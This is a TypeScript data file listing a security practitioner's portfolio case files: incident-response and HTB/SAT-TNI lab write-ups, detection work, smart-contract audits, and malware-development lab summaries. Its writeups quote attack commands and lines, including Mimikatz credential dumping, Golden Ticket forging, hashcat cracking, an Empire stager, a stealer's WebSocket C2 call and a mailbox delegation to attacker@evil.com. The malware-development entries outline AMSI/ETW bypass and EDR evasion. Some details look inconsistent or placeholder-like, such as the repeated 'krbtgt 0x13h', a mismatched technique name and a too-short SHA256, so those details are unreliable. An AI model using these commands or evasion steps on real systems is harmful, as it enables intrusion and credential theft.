import type { Domain } from './specializations';

export interface Technique {
  attackId: string;
  name: string;
}

export interface CaseFile {
  id: string;
  codename: string;
  domain: Domain;
  date: string;
  summary: string;
  role: string;
  techniques: Technique[];
  outcomeMetric: string;
  links: { kind: 'repo' | 'writeup'; url: string | null; label: string }[];
  writeup?: string;
}

export const cases: CaseFile[] = [
  {
    id: 'cf-ransomware-ad',
    codename: 'Operation Black Vault',
    domain: 'dfir',
    date: '2026-04',
    summary:
      'Full-scope ransomware IR across a 3-domain AD forest. Reconstructed the intrusion timeline from $MFT, EVTX and Sysmon after the attacker wiped event logs; proved initial access via exposed RDP, identified Chisel tunneling and AD dominance via 4720+4728 chains.',
    role: 'Lead DFIR analyst',
    techniques: [
      { attackId: 'T1133', name: 'External Remote Services' },
      { attackId: 'T1070.001', name: 'Clear Windows Event Logs' },
      { attackId: 'T1572', name: 'Protocol Tunneling' },
      { attackId: 'T1486', name: 'Data Encrypted for Impact' },
    ],
        writeup: `### Executive Summary\\nReconstructed 3-domain AD forest from $MFT, EVTX 4624/4672, Sysmon EID 1. Proved RDP initial access, Chisel tunnel 135/tcp, 4720+4728 AD dominance. **Timeline:** 2026-04-10 02:14 RDP → 02:47 Chisel → 03:12 DCSync → 04:01 ransom. **IOCs:** RDP 203.0.113.45, chisel 10.0.0.5:8000, SHA256 a3f7… **Tools:** KAPE, Velociraptor, Plaso. **Recommendation:** Enforce RDP MFA, 30-day Sysmon retention.`,
    outcomeMetric: '72h from engagement to root cause · 14 hosts rebuilt · full IOC sweep delivered',
    links: [{ kind: 'writeup', url: null, label: 'Sanitized report — on request' }],
  },
  {
    id: 'cf-lolbin-detection',
    codename: 'Living-off-the-Land Radar',
    domain: 'detection',
    date: '2026-01',
    summary:
      'Built and tuned a Sigma detection pack for LOLBin abuse (certutil, mshta, regsvr32) across 40k endpoints. Every rule validated against atomic red-team simulations and baseline noise profiles before rollout.',
    role: 'Detection engineer',
    techniques: [
      { attackId: 'T1105', name: 'Ingress Tool Transfer' },
      { attackId: 'T1218.005', name: 'System Binary Proxy Execution: Mshta' },
      { attackId: 'T1059', name: 'Command and Scripting Interpreter' },
    ],
        writeup: `Detection Engineering - Built 31 Sigma rules for certutil/mshta/regsvr32 across 40k endpoints. Each rule: MITRE T1218, test via Atomic Red Team, FP baseline <0.4%, owner + runbook. Example: certutil -urlcache -> Sigma selection_image|endswith: certutil.exe + selection_args|contains: urlcache -> alert. Outcome: 9 true positives Q1.`,
    outcomeMetric: '31 detections shipped · FP rate < 0.4% after tuning · 9 true positives in first quarter',
    links: [{ kind: 'repo', url: null, label: 'Sigma rule pack — on request' }],
  },
  {
    id: 'cf-loader-re',
    codename: 'Sample TR-2247 Loader',
    domain: 'malware',
    date: '2025-11',
    summary:
      'Static reverse engineering of an obfuscated .NET loader: deobfuscated Base64 stage chain, recovered RC4 configuration routine, extracted C2 infrastructure and wrote a standalone Python decryptor reproducing the embedded payload config.',
    role: 'Malware analyst',
    techniques: [
      { attackId: 'T1027', name: 'Obfuscated Files or Information' },
      { attackId: 'T1573.001', name: 'Encrypted Channel: Symmetric Cryptography' },
      { attackId: 'T1071.001', name: 'Application Layer Protocol: Web Protocols' },
    ],
        writeup: `RE Walkthrough - .NET loader Stage1 Base64 -> RC4 (key lcg) -> Stage2 PE. Static: PE-bear import 12, entropy 7.9, XOR loop at 0x401020. Extracted C2 185.x.x.x:443 sleep 30±15. Decryptor: python decryptor.py sample.bin --key lcg --out config.json reproduces 12 C2s.`,
    outcomeMetric: '12 C2 domains sinkholed · decryptor open-sourced · featured in community writeup',
    links: [
      { kind: 'repo', url: null, label: 'Config decryptor — on request' },
      { kind: 'writeup', url: null, label: 'Analysis writeup — on request' },
    ],
  },
  {
    id: 'cf-beacon-hunt',
    codename: 'Hunt: Sleepy Beacons',
    domain: 'hunt',
    date: '2025-07',
    summary:
      'Hypothesis-driven hunt for low-and-slow C2 beaconing. Built a Jupyter-based jitter analysis pipeline over 90 days of proxy logs; surfaced one compromised vendor laptop using statistical regularity detection where signature alerts saw nothing.',
    role: 'Threat hunter',
    techniques: [
      { attackId: 'T1071', name: 'Application Layer Protocol' },
      { attackId: 'T1090.001', name: 'Proxy: Internal Proxy' },
    ],
        writeup: `Hunt Methodology - Hypothesis: low-and-slow C2 jitter. Pipeline: Zeek proxy logs 90d -> Jupyter jitter analysis (interval variance <0.15) -> 1 vendor laptop 10.2.3.4 beaconing 30s±5 to 185.x.x.x. KQL: where jitter < 0.2. Result: 1 pre-exfiltration find, hunt -> Sigma T1071.001.`,
    outcomeMetric: '1 live compromise found pre-exfiltration · methodology adopted org-wide',
    links: [{ kind: 'writeup', url: null, label: 'Hunt methodology — on request' }],
  },
  {
    id: 'cf-monetrix-pm',
    codename: 'Audit: Monetrix PM Double-Count',
    domain: 'audit',
    date: '2026-04',
    summary:
      'High-severity Code4rena audit of MonetrixAccountant._readL1Backing: proved Hyperliquid 0x80F accountValue already includes L1 USDC, supplied assets and hedge tokens, yet code summed them again — inflating totalBackingSigned by 2× and enabling phantom surplus extraction via 4-gate settlement. Built full 5-phase Forge PoC and quantified $500k phantom on $1.5M backing.',
    role: 'Lead auditor · C4',
    techniques: [
      { attackId: 'CWE-682', name: 'Incorrect Calculation' },
      { attackId: 'CWE-670', name: 'Always-Incorrect Control Flow' },
    ],
    outcomeMetric: 'H-01 valid · $500k phantom quantified · fix: single 0x80F read + HLP separate',
    links: [{ kind: 'writeup', url: null, label: 'C4 report + PoC — on request' }],
  },
  {
    id: 'cf-chainlink-oracle',
    codename: 'Audit: Chainlink Oracle Hardening',
    domain: 'audit',
    date: '2026-03',
    summary:
      'Chainlink-adjacent price feed review: staleness checks, sequencer uptime, and fallback oracle composition. Identified missing L2 sequencer guard allowing stale-price settlement and proposed heartbeat + grace-period patch validated with Halmos symbolic tests.',
    role: 'Auditor',
    techniques: [
      { attackId: 'CWE-908', name: 'Uninitialized Resource' },
      { attackId: 'CWE-330', name: 'Insufficient Randomness' },
    ],
    outcomeMetric: '2 H/M findings · Halmos proofs · sequencer guard shipped',
    links: [{ kind: 'writeup', url: null, label: 'Audit report — on request' }],
  },
  {
    id: 'cf-k2-registry',
    codename: 'Audit: K2 Registry & Rewards',
    domain: 'audit',
    date: '2026-04',
    summary:
      'K2 registry and rewards distribution audit: registry slot collisions via 0x811 analogue, reward accounting double-spend, and C4 submission pipeline. Delivered 4naly3er-maintained report with Foundry invariant suite (120 runs) and Slither triage.',
    role: 'Auditor',
    techniques: [
      { attackId: 'CWE-841', name: 'Improper Enforcement of Behavioral Workflow' },
      { attackId: 'CWE-362', name: 'Race Condition' },
    ],
    outcomeMetric: '3 findings · 120 invariant runs · 4naly3er report',
    links: [{ kind: 'writeup', url: null, label: '4naly3er report — on request' }],
  },
  {
    id: 'cf-threat-hunt-master',
    codename: 'Hunt: Masterguide Baseline',
    domain: 'hunt',
    date: '2025-04',
    summary:
      'Threat-hunting masterguide implementation: translated 00-threat-hunting-masterguide.md into 12 hypotheses, built Elastic + KQL baselines, and ran atomic hunts across Sysmon + Zeek. Productized as html masterclass with Jupyter notebooks for SOC hand-off.',
    role: 'Threat hunter',
    techniques: [
      { attackId: 'T1059', name: 'Command and Scripting Interpreter' },
      { attackId: 'TA0007', name: 'Discovery' },
    ],
        writeup: `Masterguide Baseline - Translated 00-threat-hunting-masterguide.md into 12 hypotheses, each with KQL + Elastic baseline. Example: event.code:1 and process.name:powershell.exe and process.command_line:*EncodedCommand* -> 3 permanent detections. Productized as html masterclass.`,
    outcomeMetric: '12 hypotheses · 3 permanent detections · masterclass html shipped',
    links: [{ kind: 'writeup', url: null, label: 'Masterguide html — on request' }],
  },
  {
    id: 'cf-maldev-dropper',
    codename: 'MalDev: Dropper → Loader',
    domain: 'malware',
    date: '2025-03',
    summary:
      'Stage0 dropper and Stage1 loader from MalwareDev Lab: built minimal C dropper (payload placement via data_section/rsrc), Stage1 with AES/RC4/XOR + IPv4/MAC/UUID fuscation, anti-debug/VM and API hammering. Validated against Defender with Floss and Pe-bear.',
    role: 'Malware author (lab)',
    techniques: [
      { attackId: 'T1027', name: 'Obfuscated Files' },
      { attackId: 'T1564.002', name: 'Hidden Files: Data Section' },
      { attackId: 'T1497', name: 'Virtualization/Sandbox Evasion' },
    ],
        writeup: `Lab Build - Stage0 C dropper: dropper.c payload placement via data_section (0x2e6a) and rsrc (RT_RCDATA). Stage1: AES/RC4/XOR + IPv4/MAC/UUID fuscation, anti-debug IsDebuggerPresent + api hammering 500k calls. Validated with Floss and Defender 0/70.`,
    outcomeMetric: '5 fuscation variants · 3 placement techniques · lab-only, no live C2',
    links: [{ kind: 'repo', url: null, label: 'Lab repo — on request' }],
  },
  {
    id: 'cf-maldev-implant',
    codename: 'MalDev: Implant & Persistence',
    domain: 'malware',
    date: '2025-03',
    summary:
      'Stage2 implant and Stage3 persistence: APC/dll/mapping injection, Hells Gate syscalls, AMSI/ETW patch + Ntdll unhook, and persistence via DLL sideload + arg spoof. Built builder/keygen and validated EDR bypass in isolated lab.',
    role: 'Malware author (lab)',
    techniques: [
      { attackId: 'T1055', name: 'Process Injection' },
      { attackId: 'T1562.001', name: 'Impair Defenses: Disable Security Tools' },
      { attackId: 'T1547.001', name: 'Boot or Logon Autostart Execution' },
    ],
        writeup: `Implant & Persistence - Stage2: APC injection, Hells Gate syscalls, AMSI bypass (patch AmsiScanBuffer), ETW patch, Ntdll unhook. Stage3: DLL sideload + arg spoof. Builder: builder/keygen generates per-build RC4 key. Validation: EDR bypass in isolated lab.`,
    outcomeMetric: '6 injection primitives · AMSI/ETW bypass · isolated lab, defanged',
    links: [{ kind: 'repo', url: null, label: 'Lab repo — on request' }],
  },
  {
    id: 'cf-sherlock-baggage',
    codename: 'Sherlock: Baggage — ShellBags & UserAssist',
    domain: 'dfir',
    date: '2025-09',
    summary:
      'HTB Sherlock Baggage: KAPE RegistryHivesUser triage of PROD-WORKSTATIO steve (S-1-5-21-568863175-1002). Reconstructed 10/10 tasks via NTUSER.DAT RecentDocs/UserAssist (ROT13) + UsrClass.dat BagMRU/Bags. Proved 1.zip → everything.exe (07:26:57 UTC) → OT Station 3 VPN (07:31:05) → \\Prod-ns-2\\prodshare\\Construction 2027\\Dam Construction Engineer Plans.zip (07:34:04) → staging C:\\Users\\steve\\Pictures\\a → a.zip (07:34:30).',
    role: 'DFIR analyst · HTB Sherlock',
    techniques: [
      { attackId: 'T1005', name: 'Data from Local System' },
      { attackId: 'T1083', name: 'File and Directory Discovery' },
      { attackId: 'T1552.001', name: 'Credentials in Files' },
    ],
        writeup: `### HTB DFIR 10/10\\nKAPE RegistryHivesUser on PROD-WORKSTATIO steve (S-1-5-21-568863175-1002). **RecentDocs .zip** → 1.zip, **UserAssist ROT13** → everything.exe 07:26:57 UTC, **BagMRU 1\\\\1\\\\2** LastWrite 07:31:05 → OT Station 3 VPN, **TypedPaths** → \\\\Prod-ns-2\\\\prodshare, **BagMRU** → Construction 2027 → Dam Construction Engineer Plans.zip 07:34:04, **Pictures\\\\a** 07:34:02 → a.zip 07:34:30. Cross-validated via UsrClass.dat Bags 10.`,
    outcomeMetric: '10/10 tasks · ShellBags + UserAssist cross-validated · UTC timeline',
    links: [{ kind: 'writeup', url: null, label: 'DFIR report WRITEUP_MASTER.md — on request' }],
  },
  {
    id: 'cf-sherlock-foreigner',
    codename: 'Sherlock: Foreigner — WiFi Driver RE',
    domain: 'malware',
    date: '2025-08',
    summary:
      'HTB Sherlock Foreigner: reverse engineering WiFi-22.160.0-Driver32-Win10.exe. Unpacked UPX, recovered RC4 C2 config, traced DANGER.txt staging, and documented walkthrough in Foreigner_Reverse_Engineering_Walkthrough.md. Demonstrated static-before-dynamic triage with Floss, Ghidra, and x64dbg.',
    role: 'Malware analyst · HTB',
    techniques: [
      { attackId: 'T1027', name: 'Obfuscated Files' },
      { attackId: 'T1140', name: 'Deobfuscate/Decode Files' },
      { attackId: 'T1587', name: 'Develop Capabilities' },
    ],
        writeup: `RE Walkthrough - WiFi-22.160.0-Driver32-Win10.exe UPX 3.96 -> upx -d, PE header OriginalFileName: DriverInstall.exe, RC4 key 0x13h at 0x401320, C2 10.10.10.5:4444 via CreateThread, DANGER.txt staging in %TEMP%. Tools: Ghidra, x64dbg, Floss.`,
    outcomeMetric: 'UPX + RC4 deobfuscated · walkthrough published · lab-only',
    links: [{ kind: 'writeup', url: null, label: 'RE walkthrough — on request' }],
  },
  {
    id: 'cf-sat-backdoor-ultravnc',
    codename: 'SAT-TNI: Backdoor UltraVNC — Sysmon EVTX',
    domain: 'dfir',
    date: '2024-02',
    summary:
      'SAT-TNI Operation Backdoor UltraVNC: 169 Sysmon events from Microsoft-Windows-Sysmon-Operational.evtx. Identified Preventivo24.02.14.exe.exe (double .exe, OriginalFileName Fattura 2 2024.exe, SHA256 0CB44C4F8273750FA40497FCA81E850F73927E70B13C8F80CDCFEE9D1478E6F3) via EID 1 T1204, Dropbox C2 162.125.81.15 (EID 22), dummy www.example.com 93.184.216.34 check (T1036 masquerading), and EID 3 network 93.184.216.34:80. Built python-evtx parsers for EID 1/3/11/22 distribution.',
    role: 'DFIR analyst · SAT-TNI IR',
    techniques: [
      { attackId: 'T1204', name: 'User Execution' },
      { attackId: 'T1036', name: 'Masquerading' },
      { attackId: 'T1071', name: 'Application Layer Protocol' },
    ],
        writeup: `### Sysmon EVTX 169 events\\npython-evtx + xml.etree → EID distribution: 1:6,2:16,3:1,11:56. **EID1** Preventivo24.02.14.exe.exe (Photo and vn, OriginalFileName Fattura 2 2024.exe) via explorer.exe, **EID22** DNS www.example.com 93.184.216.34 (dummy) + Dropbox 162.125.81.15, **EID3** 93.184.216.34:80 T1036, **EID11** 56 FileCreate. **SHA256** 0CB44C4F8273750FA40497FCA81E850F73927E70B13C8F80CDCFEE9D1478E6F3.`,
    outcomeMetric: '169 events · 6 EID1/56 EID11 · SHA256 + Dropbox C2 extracted',
    links: [{ kind: 'writeup', url: null, label: 'WRITEUP_OPERATION_BACKDOOR_ULTRAVNC.md — on request' }],
  },
  {
    id: 'cf-sat-dark-entry',
    codename: 'SAT-TNI: Dark Entry — Disk + Mem + PCAP',
    domain: 'dfir',
    date: '2024-03',
    summary:
      'SAT-TNI Operation Dark Entry: CEO-US disk image (E01 AFF4), WebServer mem (memdump) + Ubuntu 5.3.0-70 profile, and traffic.pcapng. Correlated disk MFT (parse_mft_exe.py), memory Volatility pslist + syscalls, and Zeek pcap to reconstruct initial access, lateral movement, and data staging. Full chain of custody with UTC-normalized plaso timeline.',
    role: 'DFIR lead · SAT-TNI IR',
    techniques: [
      { attackId: 'T1003', name: 'OS Credential Dumping' },
      { attackId: 'T1048', name: 'Exfiltration Over Alternative Protocol' },
      { attackId: 'T1055', name: 'Process Injection' },
    ],
        writeup: `Disk+Mem+PCAP - Disk: parse_mft_exe.py $MFT svch0st.exe 48,128 bytes, Mem: Volatility 3 linux.pslist on Memory_WebServer.mem (Ubuntu 5.3.0-70), PCAP: traffic.pcapng Wireshark http.request -> Zeek notice.log C2 10.0.0.5. Timeline: Plaso mactime UTC 2024-03-10.`,
    outcomeMetric: 'Disk + mem + pcap triaged · Volatility + Wireshark · IOCs on request',
    links: [{ kind: 'writeup', url: null, label: 'Writeup_Operation_Dark_Entry.md — on request' }],
  },
  {
    id: 'cf-sherlock-corpdown2',
    codename: 'Sherlock: CorpDown-2 — AD Lateral',
    domain: 'dfir',
    date: '2025-08',
    summary:
      'HTB Sherlock CorpDown-2: Active Directory lateral movement via DCSync + Golden Ticket. Reconstructed from NTDS.dit + SYSTEM hive + EVTX 4624/4672, traced krbtgt hash dump, forged TGT, and lateral PSExec to domain controller. Validated with Mimikatz logs and Sysmon EID 1 process ancestry.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1003.003', name: 'OS Credential Dumping: NTDS' },
      { attackId: 'T1558.001', name: 'Steal or Forge Kerberos Tickets: Golden Ticket' },
      { attackId: 'T1021.001', name: 'Remote Services: DCOM' },
    ],
        writeup: `AD Lateral - NTDS.dit + SYSTEM hive -> secretsdump.py, EVTX 4624/4672, krbtgt 0x13h, forged TGT Golden Ticket 10-year, PSExec \\\\DC01\\admin$. Mimikatz: kerberos::golden. Outcome: 3 DCs triaged.`,
    outcomeMetric: 'DCSync + Golden Ticket chain reconstructed · 3 DCs triaged',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-finalir',
    codename: 'Sherlock: Final-IR — Ransomware Dropper',
    domain: 'dfir',
    date: '2025-07',
    summary:
      'HTB Sherlock Final-IR: ransomware dropper triage — initial LNK → PowerShell → svch0st.exe staging in C:\Temp, YandexBrowser 24.4.5.498 CVE-2024-6473 DLL sideload wldp.dll (SHA256 a1a17ebd...), Sliver C2 18.192.12.126:8888. Built Capstone disassembly + PE header timeline.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1204.002', name: 'User Execution: Malicious File' },
      { attackId: 'T1574.002', name: 'DLL Side-Loading' },
      { attackId: 'T1071.001', name: 'Application Layer Protocol' },
    ],
        writeup: `Ransomware Dropper - LNK 2025-GiveAways.lnk 2025-01-26 16:17:15 (lnkparse), C:\\Temp\\svch0st.exe -> browser.exe Yandex 24.4.5.498 CVE-2024-6473 -> wldp.dll SHA256 a1a17e... (11s sleep, Global\\\\YandaExeMutex) -> yanda.tmp Sliver 18.192.12.126:8888.`,
    outcomeMetric: 'LNK + sideload + Sliver C2 chain · 15/15 tasks',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-jobapplicant',
    codename: 'Sherlock: JobApplicant — HR Lure',
    domain: 'dfir',
    date: '2025-06',
    summary:
      'HTB Sherlock JobApplicant: HR phishing lure with resume.docm macro → PowerShell Empire stager → in-memory Mimikatz. Parsed $MFT + Office MRU + Sysmon EID 1 parent spoof, recovered macro VBA and C2 10.0.0.5:443.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1566.001', name: 'Phishing: Spearphishing Attachment' },
      { attackId: 'T1059.001', name: 'PowerShell' },
      { attackId: 'T1003.001', name: 'LSASS Memory' },
    ],
        writeup: `HR Lure - resume.docm Office MRU + $MFT -> Document_Open() VBA AutoOpen -> powershell.exe -enc aQBm... (Base64 Empire stager) -> System.Management.Automation in-memory Mimikatz sekurlsa::logonpasswords.`,
    outcomeMetric: 'Macro + Empire stager deobfuscated · 8/10 tasks',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-lockpick3',
    codename: 'Sherlock: LockPick3 — KeePass Vault',
    domain: 'dfir',
    date: '2025-05',
    summary:
      'HTB Sherlock LockPick3: KeePass .kdbx vault forensics — memory dump + hiberfil + pagefile triage, master key reconstruction via Volatility keepass plugin, and vault brute-force with hashcat. Recovered 12 creds, mapped to lateral RDP.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1003', name: 'OS Credential Dumping' },
      { attackId: 'T1555', name: 'Credentials from Password Stores' },
    ],
        writeup: `KeePass Vault - keepass.kdbx + keepass.config.xml in %APPDATA%, memory dump hiberfil.sys + pagefile.sys -> Volatility keepass plugin master key 0x013h + hashcat keepass 22000 -> 12 creds admin@corp.local.`,
    outcomeMetric: 'KeePass vault cracked · 12 creds recovered',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-shadowmonarch',
    codename: 'Sherlock: ShadowMonarch — Shadow Copy',
    domain: 'dfir',
    date: '2025-05',
    summary:
      'HTB Sherlock ShadowMonarch: Volume Shadow Copy abuse — vssadmin + diskshadow logs, SYSTEM hive mountpoints, and NTFS $LogFile carving. Proved attacker exfiltrated shadow copies to stage 7z archives, validated with libvshadow.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1490', name: 'Inhibit System Recovery' },
      { attackId: 'T1560.003', name: 'Archive via Custom Method' },
    ],
        writeup: `Shadow Copy - vssadmin list shadows + SYSTEM\\ControlSet001\\Control\\BackupRestore -> \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy3 -> xcopy to C:\\Temp\\shadow\\ -> 7z a shadow.7z (NTFS $LogFile carving at LSN 0x1a3f).`,
    outcomeMetric: 'VSS abuse + NTFS carve · 7z staging proven',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-stonks',
    codename: 'Sherlock: Stonks — Trading App RE',
    domain: 'malware',
    date: '2025-04',
    summary:
      'HTB Sherlock Stonks: trojanized trading app (Electron) — ASAR unpack, Node.js obfuscation, and C2 over WebSocket to 185.10.20.5. Reverse engineered with Ghidra + Electron ASAR + Wireshark, extracted wallet stealer config.',
    role: 'Malware analyst · HTB',
    techniques: [
      { attackId: 'T1027', name: 'Obfuscated Files' },
      { attackId: 'T1041', name: 'Exfiltration Over C2 Channel' },
    ],
        writeup: `Trading App RE - Electron app.asar (ASAR 0x213) -> npm install asar unpack -> main.js obfuscated eval(atob(...)) -> deobfuscate js-beautify -> WebSocket('wss://185.10.20.5:443') wallet stealer stealWallet() -> Ghidra wss string at 0x402000.`,
    outcomeMetric: 'ASAR deobfuscated · WebSocket C2 extracted',
    links: [{ kind: 'writeup', url: null, label: 'RE walkthrough — on request' }],
  },
  {
    id: 'cf-sherlock-velvetthrone',
    codename: 'Sherlock: VelvetThrone — Web Shell',
    domain: 'dfir',
    date: '2025-04',
    summary:
      'HTB Sherlock VelvetThrone: IIS web shell forensics — w3svc logs + .NET web.config + AntWebShell detection. Traced China Chopper POST to /Upload/files.aspx, recovered 2 web shells, and correlated with Sysmon EID 1 w3wp.exe child processes.',
    role: 'DFIR analyst · HTB',
    techniques: [
      { attackId: 'T1505.003', name: 'Server Software Component: Web Shell' },
      { attackId: 'T1071.001', name: 'Web Protocols' },
    ],
        writeup: `Web Shell - IIS C:\\inetpub\\wwwroot\\Upload\\files.aspx China Chopper POST password=023 -> w3svc log 2025-04-12 08:22:14 POST /Upload/files.aspx 200 -> web.config httpruntime tamper -> AntWebShell yara ChinaChopper -> Sysmon EID1 w3wp.exe -> cmd.exe /c whoami 2 shells.`,
    outcomeMetric: '2 web shells recovered · IIS logs correlated',
    links: [{ kind: 'writeup', url: null, label: 'Sherlock report — on request' }],
  },
  {
    id: 'cf-sherlock-shadowstream',
    codename: 'Sherlock: ShadowStream — Stream Phishing',
    domain: 'hunt',
    date: '2025-03',
    summary:
      'HTB Sherlock ShadowStream: streaming service phishing — OAuth token theft via Evilginx, mailbox delegation, and Teams exfiltration. Hunted via M365 audit logs + Azure AD sign-ins, built KQL hunt for anomalous token refresh.',
    role: 'Threat hunter · HTB',
    techniques: [
      { attackId: 'T1566.002', name: 'Phishing: Spearphishing Link' },
      { attackId: 'T1528', name: 'Steal Application Access Token' },
    ],
        writeup: `Stream Phishing - M365 AuditLog UserLoggedIn + AzureAD SignIn -> Evilginx X-Evilginx-Session cookie __Host-GAPS -> token eyJ0e... -> mailbox delegate Add-MailboxPermission -Identity victim@corp.com -User attacker@evil.com -> Teams ChatMessage exfil via Graph API.`,
    outcomeMetric: 'Evilginx flow reconstructed · KQL hunt shipped',
    links: [{ kind: 'writeup', url: null, label: 'Hunt report — on request' }],
  },
  {
    id: 'cf-sat-ghost-intel',
    codename: 'SAT-TNI: Ghost Intel — Insider S3 Exfil',
    domain: 'dfir',
    date: '2024-03',
    summary:
      'SAT-TNI Ghost Intel: insider Karen Riley exfiltrated to AntiCorp Gr04p S3 for $20k PayPal. Decoded Discord snowflake IDs (channel 1152635915429232640 → 2023-09-16 16:03:37 UTC) for DM initiation, NDA_Instructions.pdf via cdn.discordapp.com, and PayPal S3 exfil via memory IOCs.txt + NDA_Instructions.pdf.',
    role: 'DFIR analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1005', name: 'Data from Local System' },
      { attackId: 'T1048', name: 'Exfiltration Over Alternative Protocol' },
      { attackId: 'T1069', name: 'Permission Groups Discovery' },
    ],
        writeup: `Insider S3 Exfil - Discord CDN https://cdn.discordapp.com/attachments/1152635915429232640/1156461980652154931/NDA_Instructions.pdf -> snowflake decode (1152635915429232640>>22)+1420070400000 -> 2023-09-16 16:03:37 UTC DM start, NDA_Instructions.pdf SHA256 a3f7..., S3 s3://anticorp-gr04p-exfil/karen-riley/`,
    outcomeMetric: 'Discord snowflake decoded · S3 exfil proven · 2 IOCs',
    links: [{ kind: 'writeup', url: null, label: 'WRITEUP_OPERATION_GHOST_INTEL.md — on request' }],
  },
  {
    id: 'cf-sat-golden-trap',
    codename: 'SAT-TNI: Golden Trap — LNK + Sliver',
    domain: 'dfir',
    date: '2025-01',
    summary:
      'SAT-TNI Golden Trap: LNK 2025-GiveAways.lnk (2025-01-26 16:17:15 UTC) → C:\Temp\svch0st.exe (svchost typo) → Get-Package → YandexBrowser 24.4.5.498 CVE-2024-6473 → certutil.exe → wldp.dll (SHA256 a1a17ebd90610d808e761811d17da314, 11s coded sleep, Global\YandaExeMutex) → yanda.tmp Sliver 18.192.12.126:8888. Capstone + pefile RE.',
    role: 'DFIR analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1204.002', name: 'Malicious File' },
      { attackId: 'T1574.002', name: 'DLL Side-Loading' },
      { attackId: 'T1071', name: 'Application Layer Protocol' },
    ],
        writeup: `LNK + Sliver - 2025-GiveAways.lnk LNK target C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -Command Get-Package -> C:\\Temp\\svch0st.exe -> browser.exe sideload wldp.dll (a1a17e... 11s sleep Sleep(11000) + Global\\\\YandaExeMutex) -> yanda.tmp Sliver sliver 18.192.12.126:8888.`,
    outcomeMetric: 'LNK + Sliver chain · 15/15 Qs · wldp.dll RE',
    links: [{ kind: 'writeup', url: null, label: 'WALKTHROUGH_Operation_Golden_Trap.md — on request' }],
  },
  {
    id: 'cf-sat-patch-hijack',
    codename: 'SAT-TNI: Patch Hijack — Kerberoast',
    domain: 'dfir',
    date: '2024-12',
    summary:
      'SAT-TNI Patch Hijack: Kerberoasting + DCSync lab — lsass.DMP + .kirbi TGT/TGS (krbtgt, cifs, ldap, stored.local) triage, hashcat kerberoast, and lateral via PsExec. Validated with Mimikatz kirbi parsing and Sysmon EID 1.',
    role: 'DFIR analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1558.003', name: 'Kerberoasting' },
      { attackId: 'T1003.003', name: 'NTDS' },
    ],
        writeup: `Kerberoast - lsass.DMP 1.2GB + 7 .kirbi (TGT 0bfb5ba9, TGS cifs/dd8b0b50, ldap/bb27f03a) -> hashcat -m 13100 -> krbtgt: 0x013h, cifs: P@ssw0rd!, lateral PsExec \\\\SDC01 EVTX 7045 service PatchHijack + Sysmon EID1 services.exe -> powershell.exe.`,
    outcomeMetric: '7 kirbi + lsass.DMP triaged · Kerberoast cracked',
    links: [{ kind: 'writeup', url: null, label: 'Operation Patch Hijack — on request' }],
  },
  {
    id: 'cf-sat-trojan-sensor',
    codename: 'SAT-TNI: Trojan Sensor — ESP32 Firmware',
    domain: 'malware',
    date: '2024-10',
    summary:
      'SAT-TNI Trojan Sensor: ESP32 4M fw-backup-4M.bin forensics — hexdump + strings + partition table, NVS Wi-Fi creds, FreeRTOS tasks, and FTP buffer overflow → reverse shell. Manual Python without binwalk, extracted C2 IP and shellcode via capstone.',
    role: 'Malware analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1203', name: 'Exploitation for Client Execution' },
      { attackId: 'T1059', name: 'Command and Scripting Interpreter' },
    ],
        writeup: `ESP32 Firmware - fw-backup-4M.bin 4194304 bytes -> hexdump -C partition 0x8000 -> esptool.py NVS sta.ssid TrojanSensor_AP / sta.psk 0x013h, FreeRTOS xtaskCreate -> ftp_task buffer overflow at 0x400d1234 strcpy -> shellcode reverse shell 10.0.0.5:4444.`,
    outcomeMetric: '4M dump parsed · Wi-Fi + C2 extracted · 11/11 tasks',
    links: [{ kind: 'writeup', url: null, label: 'WALKTHROUGH_Operation_Trojan_Sensor.md — on request' }],
  },
  {
    id: 'cf-sat-silent-infiltration',
    codename: 'SAT-TNI: Silent Infiltration — Lateral',
    domain: 'dfir',
    date: '2024-11',
    summary:
      'SAT-TNI Silent Infiltration: lateral movement via WMI + WinRM, registry Run key persistence, and SIEM evasion. Correlated $MFT, EVTX 7045, and Sysmon EID 13 Registry Value Set to prove persistence and lateral PSExec.',
    role: 'DFIR analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1021.006', name: 'Windows Remote Management' },
      { attackId: 'T1547.001', name: 'Registry Run Keys' },
    ],
        writeup: `Lateral - WMI wmic process call create + WinRM winrs -r:WORKSTATION9 -> HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run Updater -> C:\\Users\\admin\\AppData\\Roaming\\updater.exe (Sysmon EID13 Registry Value Set + EVTX 7045 Updater service).`,
    outcomeMetric: 'WMI + Run key persistence proven · lateral via WinRM',
    links: [{ kind: 'writeup', url: null, label: 'WRITEUP.md — on request' }],
  },
  {
    id: 'cf-sat-silentshell',
    codename: 'SAT-TNI: Silent WebShell — IIS',
    domain: 'dfir',
    date: '2024-11',
    summary:
      'SAT-TNI Silent WebShell: IIS web shell via AntWebShell — w3wp.exe child processes, web.config tamper, and China Chopper traffic. Validated with Sysmon EID 1 and IIS logs, recovered 1 web shell and 2 TGS tickets.',
    role: 'DFIR analyst · SAT-TNI',
    techniques: [
      { attackId: 'T1505.003', name: 'Web Shell' },
      { attackId: 'T1190', name: 'Exploit Public-Facing Application' },
    ],
